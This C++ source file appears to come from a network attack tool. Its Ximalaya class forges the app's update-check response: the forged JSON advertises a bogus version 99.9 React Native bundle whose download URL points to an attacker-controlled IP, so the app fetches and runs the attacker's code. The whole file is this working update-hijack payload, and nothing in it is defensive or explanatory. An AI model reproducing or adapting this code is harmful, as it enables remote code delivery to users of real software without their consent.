
#include "ximalaya.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int Ximalaya::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	string version = "99.9";	//84.0

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=UTF-8\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"msg\":\"0\",\"ret\":0,\"data\":\""
		"[{\\\"bundleName\\\":\\\"reactnative\\\",\\\"compVersion\\\":\\\"%s\\\",\\\"fileMd5\\\":\\\"%s\\\","
		"\\\"fileUrl\\\":\\\"http://%s/%s\\\",\\\"fileVersion\\\":\\\"%s\\\",\\\"id\\\":1056,\\\"mobileTraffic\\\":false,"
		"\\\"patchPropId\\\":15,\\\"patchPropName\\\":\\\"reactnative\\\",\\\"size\\\":%u,\\\"status\\\":4,\\\"wifi\\\":true}]\","
		"\"signature\":\"%s\",\"threshold\":2048}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		version.c_str(), m_szmd5, szip.c_str(), filename.c_str(), version.c_str(), m_filesize,m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;

}
